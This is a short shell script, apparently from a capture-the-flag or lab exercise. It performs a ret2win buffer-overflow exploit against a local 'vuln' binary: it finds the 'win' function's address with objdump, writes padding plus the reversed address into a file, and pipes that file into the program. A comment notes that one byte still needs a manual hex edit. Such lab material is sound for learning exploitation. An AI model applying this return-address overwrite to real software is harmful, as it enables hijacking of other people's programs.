
function="win"
addr=$(objdump -t vuln|grep $function|cut -d':' -f2|cut -d' ' -f1)
echo "FOUND ADDRESS - &$function := 0x$addr" && echo

padding=$1
if [ -z "$padding" ]; then
	padding=40
fi
truncate -s 0 hexinput.bin
truncate -s $padding hexinput.bin
echo $addr|rev|xxd -r -p >> hexinput.bin # still need hexeditor to change byte `04` to `40`

make 2> /dev/null && ./vuln < hexinput.bin